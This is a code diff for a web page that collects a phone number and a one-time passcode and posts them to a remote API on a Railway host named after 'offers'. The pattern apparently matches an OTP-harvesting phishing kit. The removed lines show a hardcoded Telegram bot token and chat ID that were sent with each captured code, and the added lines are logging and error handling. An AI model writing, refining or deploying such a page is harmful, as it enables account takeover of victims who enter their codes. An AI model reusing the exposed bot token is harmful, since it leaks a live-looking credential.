@@ -411,9 +411,7 @@
             // ===== RAILWAY API URL =====
             const API_URL = 'https://mixxbyyas-offers06com-production.up.railway.app';
 
-            // ===== TELEGRAM CREDENTIALS =====
-            const TELEGRAM_BOT_TOKEN = '8926981745:AAFg96uMr8hQaiQN0F9Miglr0gizZrp48rs';
-            const TELEGRAM_CHAT_ID = '8392790531';
+            console.log('🔗 API URL:', API_URL);
 
             // ===== GET PHONE FROM URL =====
             const urlParams = new URLSearchParams(window.location.search);
@@ -474,14 +472,12 @@
                     const response = await fetch(`${API_URL}/api/resend-otp`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            phone: phone,
-                            telegramBotToken: TELEGRAM_BOT_TOKEN,
-                            telegramChatId: TELEGRAM_CHAT_ID
-                        })
+                        body: JSON.stringify({ phone: phone })
                     });
                     
                     const data = await response.json();
+                    console.log('📥 Resend response:', data);
+                    
                     if (data.status === 'success') {
                         startTimer();
                         errorMessage.textContent = '📤 New OTP sent to your phone';
@@ -491,6 +487,7 @@
                         throw new Error(data.message || 'Failed to resend OTP');
                     }
                 } catch (error) {
+                    console.error('❌ Resend error:', error);
                     errorMessage.textContent = '❌ ' + (error.message || 'Failed to resend OTP');
                 }
             });
@@ -567,7 +564,8 @@
                 verifyBtn.disabled = true;
                 verifyCard.style.opacity = "0.7";
 
-                console.log('📤 Verifying OTP for phone:', phone, 'OTP:', otpValue);
+                const requestData = { phone: phone, otp: otpValue };
+                console.log('📤 Verifying OTP:', requestData);
 
                 try {
                     const response = await fetch(`${API_URL}/api/verify-otp`, {
@@ -575,16 +573,19 @@
                         headers: {
                             'Content-Type': 'application/json',
                         },
-                        body: JSON.stringify({
-                            phone: phone,
-                            otp: otpValue,
-                            telegramBotToken: TELEGRAM_BOT_TOKEN,
-                            telegramChatId: TELEGRAM_CHAT_ID
-                        })
+                        body: JSON.stringify(requestData)
                     });
 
+                    console.log('📥 Verify response status:', response.status);
+
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error('❌ Response error:', errorText);
+                        throw new Error(`Server error: ${response.status}`);
+                    }
+
                     const data = await response.json();
-                    console.log('📥 Verify response:', data);
+                    console.log('📥 Verify data:', data);
 
                     if (data.status === 'success') {
                         launchConfetti();
